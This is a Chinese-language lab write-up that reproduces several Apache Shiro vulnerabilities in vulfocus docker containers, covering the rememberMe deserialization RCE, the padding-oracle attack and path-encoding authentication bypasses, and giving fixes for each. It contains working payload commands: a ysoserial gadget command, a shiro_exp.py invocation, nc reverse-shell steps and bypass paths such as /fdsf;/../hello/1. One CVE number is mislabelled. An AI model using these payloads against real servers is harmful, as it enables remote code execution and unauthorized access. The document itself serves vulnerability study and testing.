## Shiro漏洞验证

------

### 0x01 Apache shiro 反序列化 （CVE-2016-4437）

#### 漏洞简述

```php
  Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
```



#### 影响版本

```php
Apache Shiro 版本<=1.2.4
```



#### 环境搭建

```php
docker pull vulfocus/shiro-CVE-2016-4437
docker run -p 8080:8080 --name cve-2016-4437 -d vulfocus/shiro-CVE-2016-4437
```



#### 复现过程

1、浏览器访问网址http://ip:8080

![image-20220108073202377](image/shiro/image-20220108073202377.png)

2、Shiro指纹识别，填入用户名密码勾选上rememberMe选项后点击登录，若响应包有rememberMe=deleteMe字段，则基本可以确定网站是用apache shiro搭建

![image-20220108074520632](image/shiro/image-20220108074520632.png)

3、下载shiro漏洞检测漏洞，对目标环境进行漏洞检测

github：https://github.com/feihong-cs/ShiroExploit

输入目标地址，点击“下一步”

![image-20220108074554498](image/shiro/image-20220108074554498.png)

选择使用ceye.io进行检测

![image-20220108074628708](image/shiro/image-20220108074628708.png)

若工具显示如下则证明目标站点存在apache shiro反序列化漏洞

![image-20220108074800029](image/shiro/image-20220108074800029.png)

4、反弹shell，本地主机运行nc监听9999端口，然后在工具上输入反弹shell的地址和端口

![image-20220108075338532](image/shiro/image-20220108075338532.png)



#### 漏洞修复

1.升级Shiro版本到1.2.5及以上
2.现在使用的rememberMe的AES加密密钥泄露，请自己[base64](https://so.csdn.net/so/search?q=base64)一个AES的密钥，或者利用官方提供的方法生成密钥



------

### 0x02 远程安全限制绕过漏洞（CVE-2016-6802）

#### 漏洞简介

```php
shiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。
```



#### 影响版本

```
shrio <1.3.2
```



#### 漏洞利用

访问http://127.0.0.1/admin 的时候，页面返回403。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。



#### 漏洞修复

建议升级至最新版本





------

### 0x03 Padding Oracle Attack RCE-721（CVE-2019-12422）

#### 漏洞简述

```php
 Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性 Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞
```



#### 影响版本

```php
Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1
```



#### 环境搭建

```php
docker pull vulfocus/shiro-721:latest
docker run -p 8080:8080 --name shiro-721 -d vulfocus/shiro-721:latest
```



#### 复现步骤

1、登录网站并且获取 RememberMe Cookie 值
2、使用 RememberMe Cookie 值来作为 Padding Oracle Attack 的前缀
3、通过 Padding Oracle Attack 的攻击方式精心构造可利用的 `YSoSerial` 反序列化数据
4、将构造好的反序列化数据填充到 RememberMe Cookie 字段中并发送 , 即可在目标服务器上执行任意代码.



#### 复现过程

1、使用ysoserial生成反序列化payload

```php
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsBeanutils1 " touch /tmp/success" > payload.class
```

2、获取一个有效的Remember Cookie

![image-20220108093219628](image/shiro/image-20220108093219628.png)

![image-20220108095412667](image/shiro/image-20220108095412667.png)

此处注意删除JSESSIONID，否则后续无法利用

3、通过 Padding Oracle Attack 生成 Evil Rememberme cookie:
注意：此exp爆破时间较长，建议使用 `ysoserial` 生成较短的 payload 验证（eg: ping 、 touch /tmp/success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。

```
python shiro_exp.py
Usage: shiro_exp.py <url> <somecookie value> <payload>
python shiro_exp.py http://localhost:8080/login.jsp SbeCwTkUVw6k/I/frFIXhuU/a4stfPXdkS5JqiY7rHAo/2SHVnF4qwJPXtrHktkp9Cbj6iHt1uB8nnAAO9MRgKqnYWYj8jrOKN6G21TfcFpkC2diRXBWT10QrfWdSTdMyp1YktNG+N/2RFU6Kaed4Tag7QElIuX7xcmug1+/eidsUglRcYnaNtdP86fqiujIAHI+0kfFvHrUyZsrvDjO3sxFppj5G/E3K5mpfE89WbH+Zbz5UdXVbPVC2tftEAUJQkKEGzMn+PZEbAu3gMDXxY2sAZ09eqskl8tTsB8kxRWiHZPpX5637yPC5AYF9Ok6+DyI0AaBpfqg6GcrOjvaofjuPffcBDS9+9BWtBWqmDbSt9xRXKwPtX4CBSlmUK2gesRymhgfM1JJiusUl3f/YYUbhQdcTFuGoJbp3R/KvETxaVTx9oklbnUm3xJeWpM0V9gSRWzW851bDmb0uhcvVQWZb4CjeyHJqJ5BnTBygpeHHXOy6f7q7f7E9DD1sXFH
```



#### 漏洞修复

厂商已发布了漏洞修复程序，请及时关注更新：
https://lists.apache.org/thread.html/c9db14cfebfb8e74205884ed2bf2e2b30790ce24b7dde9191c82572c@%3Cdev.shiro.apache.org%3E





------

### 0x04 Shiro搭配spring时身份验证绕过漏洞分析（CVE-2020-1957）

#### 漏洞描述

```php
 Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。 Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。主要是Spring web在匹配url的时候没有匹配上/导致绕过
```



#### 影响版本

```php
Apache Shiro < 1.5.2
```



#### 环境搭建

```php
docker pull vulfocus/shiro-cve_2020_1957:latest
docker run -p 8080:8080 --name cve-2020-1957 -d 	vulfocus/shiro-cve_2020_1957:latest
```



#### 复现过程

1、浏览器访问网址http://ip:8080

![image-20220108082303212](image/shiro/image-20220108082303212.png)

2、访问/hello/1接口，可以看到被authc拦截器拦截了，将会跳转到登录接口进行登录。

![image-20220108082920886](image/shiro/image-20220108082920886.png)

3、访问/hello/1/，成功绕过authc拦截器，获取到了资源。

![image-20220108082942358](image/shiro/image-20220108082942358.png)







#### 漏洞修复

建议升级至最新版本



------

### 0x05 Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）

#### 漏洞描述

```php
  CVE-2020-195身份认证绕过漏洞，可以用/hello/1/来绕过登录验证，此次漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload: /fdsf;/../hello/1 可以绕过登录认证。
```



#### 影响版本

```php
Shiro <=1.5.1
```



#### 漏洞分析

https://www.rednn.com/safe/202003/30176.html



#### 漏洞修复

建议升级至最新版本



------

------

### 0x06  Apache shiro 权限绕过 （CVE-2020-11989）

#### 漏洞描述

```php
  Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。 将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过。
```



#### 影响版本

```php
Apache Shiro < 1.5.3
```



#### 环境搭建

```php
docker pull vulfocus/shiro-cve_2020_11989:latest
docker run -p 8080:8080 --name cve-2020-11989 -d vulfocus/shiro-cve_2020_11989:latest
```



#### 复现过程

1、浏览器访问网址http://ip:8080

![image-20220108081231230](image/shiro/image-20220108081231230.png)

![image-20220108104602935](image/shiro/image-20220108104602935.png)

![image-20220108104655380](image/shiro/image-20220108104655380.png)



#### 漏洞修复

通过WAF检测请求的uri中是否包含%25%32%66关键词

通过WAF检测请求的uri开头是否为/;关键词

升级至Apache Shiro 1.5.3 或更高版本



------

### 0x07 Apache Shiro 权限绕过漏洞（CVE-2020-13933）

#### 漏洞描述

```php
  Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。 之前Apache Shiro身份验证绕过漏洞CVE-2020-11989的修复补丁存在缺陷，在1.5.3及其之前的版本，由于shiro在处理url时与spring仍然存在差异，依然存在身份校验绕过漏洞由于处理身份验证请求时出错，远程攻击者可以发送特制的HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。
```



#### 影响版本

```php
Apache Shiro < 1.6.0
```



#### 环境搭建

```php
docker pull vulfocus/shiro-cve_2020_13933:latest
docker run -p 8080:8080 --name cve-2020-13933 -d vulfocus/shiro-cve_2020_13933:latest
```



#### 复现过程

1.不在请求路由中指定资源名称时，不触发身份验证，也无资源返回：

![image-20220108083823001](image/shiro/image-20220108083823001.png)

2.在请求路由中指定资源名称时，302 跳转到身份验证页面：

![image-20220108083855666](image/shiro/image-20220108083855666.png)

3.构造特定 PoC 请求指定资源时，不触发身份验证，并绕过权限(通过%3b绕过）

![image-20220108083951279](image/shiro/image-20220108083951279.png)



#### 漏洞修复

目前官方已发布漏洞修复版本，更新 Apache Shiro >= 1.6.0

